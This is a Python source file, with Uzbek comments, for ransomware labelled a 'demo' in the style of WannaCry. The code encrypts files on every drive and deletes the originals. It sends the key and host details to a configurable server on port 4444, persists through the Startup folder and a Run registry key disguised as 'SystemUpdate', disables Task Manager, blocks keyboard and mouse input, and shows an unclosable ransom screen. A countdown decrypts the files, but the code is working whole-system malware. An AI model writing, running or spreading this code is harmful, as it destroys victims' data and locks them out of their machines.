import os
import sys
import time
import threading
import hashlib
import socket
import json
import platform
import getpass
import shutil
import subprocess
import ctypes
import tkinter as tk
from tkinter import messagebox

# ==================== SOZLAMALAR ====================
# O'zingizning IP va portingizni shu yerga kiriting
SERVER_IP = "192.168.1.100"    # <--- O'ZGARTIRING
SERVER_PORT = 4444             # <--- O'ZGARTIRING

KEY = b"apple77777777"          # Shifrlash kaliti (UI da ko'rsatilmaydi)
TIMER_HOURS = 24                # Ortga sanash (soat)
# TEST UCHUN: TIMER_HOURS=0, TIMER_MINUTES=0, TIMER_SECONDS=10 qilib o'zgartiring
TIMER_MINUTES = 0
TIMER_SECONDS = 0

# Butun tizimni shifrlashda shifrlanmasligi kerak bo'lgan kengaytmalar
EXCLUDE_EXTENSIONS = {
    ".exe", ".dll", ".sys", ".py", ".pyd", ".pyc", ".so", ".lib", ".ini",
    ".bat", ".cmd", ".com", ".msi", ".bin", ".iso", ".vhd", ".vmdk", ".vdi",
    ".bak", ".tmp", ".log", ".lnk", ".msu", ".mui", ".drv", ".cat", ".inf",
    ".pol", ".dat", ".manifest", ".mui", ".chm", ".hlp", ".cpl", ".scr"
}
# ====================================================

# AES kalitini tayyorlash (SHA-256)
AES_KEY = hashlib.sha256(KEY).digest()
IV = b"1234567890123456"   # 16 baytlik qat'iy IV (soddalashtirilgan)

# Cryptography importlari
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def pad(data):
    pad_len = 16 - (len(data) % 16)
    return data + bytes([pad_len] * pad_len)

def unpad(data):
    pad_len = data[-1]
    return data[:-pad_len]

def should_encrypt(filepath):
    """Fayl shifrlanishi kerakmi yoki yo'qmi aniqlaydi"""
    ext = os.path.splitext(filepath)[1].lower()
    if ext in EXCLUDE_EXTENSIONS:
        return False
    # O'z papkamizdagi fayllarni shifrlamaymiz (zaruriy)
    try:
        exe_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        if os.path.abspath(filepath).startswith(exe_dir):
            return False
    except:
        pass
    return True

def encrypt_file(filepath):
    """Faylni shifrlaydi va .locked kengaytmasini qo'shadi"""
    try:
        if not should_encrypt(filepath):
            return False
        with open(filepath, 'rb') as f:
            plaintext = f.read()
        cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(IV), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(pad(plaintext)) + encryptor.finalize()
        with open(filepath + ".locked", 'wb') as f:
            f.write(ciphertext)
        os.remove(filepath)
        return True
    except Exception as e:
        # print(f"Shifrlashda xato {filepath}: {e}")
        return False

def decrypt_file(filepath):
    """.locked faylini deshifrlaydi va asl nomini tiklaydi"""
    try:
        with open(filepath, 'rb') as f:
            ciphertext = f.read()
        cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(IV), backend=default_backend())
        decryptor = cipher.decryptor()
        plaintext = unpad(decryptor.update(ciphertext) + decryptor.finalize())
        original_name = filepath[:-7]   # .locked ni olib tashlash
        with open(original_name, 'wb') as f:
            f.write(plaintext)
        os.remove(filepath)
        return True
    except Exception as e:
        # print(f"Deshifrlashda xato {filepath}: {e}")
        return False

# ================= SERVERGA YUBORISH =================
def send_info_to_server():
    """Serverga kalit va tizim ma'lumotlarini yuboradi"""
    try:
        data = {
            "key": KEY.decode(),
            "hostname": platform.node(),
            "username": getpass.getuser(),
            "os": platform.platform(),
            "ip": socket.gethostbyname(socket.gethostname()),
            "timestamp": time.time()
        }
        serialized = json.dumps(data)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((SERVER_IP, SERVER_PORT))
        sock.sendall(serialized.encode())
        sock.close()
    except Exception as e:
        pass

# ================= PERSISTENCE (AUTOSTART) =================
def add_to_startup():
    """Dasturni tizimga autostart qilib qo'shadi (qayta yuklanganda ham ishga tushadi)"""
    try:
        if os.name == 'nt':
            import winreg
            # 1. Startup papkasiga nusxalash
            startup_dir = os.path.join(
                os.environ.get('APPDATA', ''),
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
            )
            exe_path = os.path.abspath(sys.argv[0])
            new_path = os.path.join(startup_dir, 'system_update.exe')
            if not os.path.exists(new_path):
                shutil.copy2(exe_path, new_path)
            # 2. Registry Run kalitiga yozish
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "SystemUpdate", 0, winreg.REG_SZ, new_path)
            return True
    except Exception as e:
        pass
    return False

def remove_from_startup():
    """Autostart yozuvlarini o'chiradi (deshifrlashdan keyin)"""
    try:
        if os.name == 'nt':
            import winreg
            startup_dir = os.path.join(
                os.environ.get('APPDATA', ''),
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
            )
            new_path = os.path.join(startup_dir, 'system_update.exe')
            if os.path.exists(new_path):
                os.remove(new_path)
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                try:
                    winreg.DeleteValue(regkey, "SystemUpdate")
                except:
                    pass
    except:
        pass

# ================= TIZIMNI BLOKLASH =================
def block_system():
    """Task Manager, oynani yopish, Alt+F4 va boshqalarni bloklaydi"""
    try:
        if os.name == 'nt':
            import winreg
            # Task Manager ni o'chirish
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            with winreg.CreateKey(key, subkey) as regkey:
                winreg.SetValueEx(regkey, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            # Ctrl+Alt+Del ni qisman cheklash (LockWorkstation)
            with winreg.CreateKey(key, subkey) as regkey:
                winreg.SetValueEx(regkey, "DisableLockWorkstation", 0, winreg.REG_DWORD, 1)
            # CMD ni o'chirish (ixtiyoriy)
            # with winreg.CreateKey(key, subkey) as regkey:
            #     winreg.SetValueEx(regkey, "DisableCMD", 0, winreg.REG_DWORD, 1)
            # Kiritishni bloklash (sichqoncha va klaviatura)
            ctypes.windll.user32.BlockInput(True)
    except Exception as e:
        pass

def unblock_system():
    """Bloklangan tizimni tiklaydi"""
    try:
        if os.name == 'nt':
            import winreg
            ctypes.windll.user32.BlockInput(False)
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                try:
                    winreg.DeleteValue(regkey, "DisableTaskMgr")
                except:
                    pass
                try:
                    winreg.DeleteValue(regkey, "DisableLockWorkstation")
                except:
                    pass
    except:
        pass

# ================= SHIFRLASH / DESHIFRLASH =================
def encrypt_system():
    """Barcha disklardagi fayllarni shifrlaydi (ruxsat doirasida)"""
    if os.name == 'nt':
        drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    else:
        drives = ['/']

    for drive in drives:
        for root, dirs, files in os.walk(drive):
            if "System Volume Information" in root or "$Recycle.Bin" in root:
                continue
            for file in files:
                filepath = os.path.join(root, file)
                encrypt_file(filepath)

def decrypt_system():
    """Barcha .locked fayllarni tiklaydi"""
    if os.name == 'nt':
        drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    else:
        drives = ['/']

    for drive in drives:
        for root, dirs, files in os.walk(drive):
            if "System Volume Information" in root or "$Recycle.Bin" in root:
                continue
            for file in files:
                if file.endswith(".locked"):
                    filepath = os.path.join(root, file)
                    decrypt_file(filepath)

# ================= INTERFEYS (WannaCry uslubida) =================
class RansomwareDemo:
    def __init__(self, master):
        self.master = master
        master.title("Ooops, your files have been encrypted!")
        master.attributes('-fullscreen', True)   # To'liq ekran
        master.attributes('-topmost', True)      # Doim oldinda
        master.overrideredirect(True)            # Oyna ramkasini olib tashlash
        master.configure(bg='black')

        # Oynani yopishga urinishlarni bloklash
        master.protocol("WM_DELETE_WINDOW", self.block_close)

        # Asosiy konteyner
        container = tk.Frame(master, bg='black')
        container.pack(fill=tk.BOTH, expand=True)

        # Chap qizil panel
        left_panel = tk.Frame(container, bg='#8B0000', width=250)
        left_panel.pack(side=tk.LEFT, fill=tk.Y)
        left_panel.pack_propagate(False)

        # Katta ogohlantirish belgisi
        warning_label = tk.Label(
            left_panel,
            text="!",
            font=("Arial", 120, "bold"),
            fg="white",
            bg="#8B0000"
        )
        warning_label.pack(pady=60)

        # O'ng panel (matnlar)
        right_panel = tk.Frame(container, bg='black')
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

        # Sarlavha
        title = tk.Label(
            right_panel,
            text="Ooops, your files have been encrypted!",
            font=("Arial", 28, "bold"),
            fg="#FF0000",
            bg="black"
        )
        title.pack(pady=20)

        # Tavsif
        desc = tk.Label(
            right_panel,
            text="What happened to my computer?\n\n"
                 "All your important files are encrypted.\n"
                 "Do not try to close this window or turn off your computer.\n"
                 "Your files will be decrypted automatically after the countdown.",
            font=("Arial", 14),
            fg="white",
            bg="black",
            justify=tk.LEFT
        )
        desc.pack(pady=20)

        # Taymer
        self.timer_label = tk.Label(
            right_panel,
            text="",
            font=("Courier", 48, "bold"),
            fg="#FF0000",
            bg="black"
        )
        self.timer_label.pack(pady=30)

        # Qo'shimcha matn
        note = tk.Label(
            right_panel,
            text="testing by agrresore",
            font=("Arial", 10),
            fg="#555555",
            bg="black"
        )
        note.pack(side=tk.BOTTOM, pady=10)

        # Tizimni bloklash va serverga yuborish (threadda)
        threading.Thread(target=block_system, daemon=True).start()
        threading.Thread(target=send_info_to_server, daemon=True).start()

        # Shifrlashni boshlash (threadda)
        threading.Thread(target=encrypt_system, daemon=True).start()

        # Taymerni boshlash
        self.remaining = TIMER_HOURS * 3600 + TIMER_MINUTES * 60 + TIMER_SECONDS
        self.update_timer()

    def block_close(self):
        """Oynani yopishga urinishlarni bloklaydi"""
        # Hech narsa qilmaymiz – oyna yopilmaydi
        pass

    def update_timer(self):
        if self.remaining > 0:
            hrs = self.remaining // 3600
            mins = (self.remaining % 3600) // 60
            secs = self.remaining % 60
            self.timer_label.config(text=f"{hrs:02d}:{mins:02d}:{secs:02d}")
            self.remaining -= 1
            self.master.after(1000, self.update_timer)
        else:
            self.timer_label.config(text="00:00:00")
            self.decrypt_files()

    def decrypt_files(self):
        # Deshifrlashni threadda bajarish
        threading.Thread(target=decrypt_system, daemon=True).start()
        # Tizimni tiklash
        threading.Thread(target=unblock_system, daemon=True).start()
        threading.Thread(target=remove_from_startup, daemon=True).start()
        # Xabar ko'rsatish
        messagebox.showinfo(
            "Qayta tiklandi",
            "Barcha fayllaringiz muvaffaqiyatli qayta tiklandi!\n"
            "Endi kompyuteringizdan foydalanishingiz mumkin."
        )
        self.master.destroy()

# ================= ASOSIY DASTUR =================
if __name__ == "__main__":
    # Autostartni qo'shish (agar allaqachon mavjud bo'lmasa)
    add_to_startup()

    root = tk.Tk()
    app = RansomwareDemo(root)
    root.mainloop()
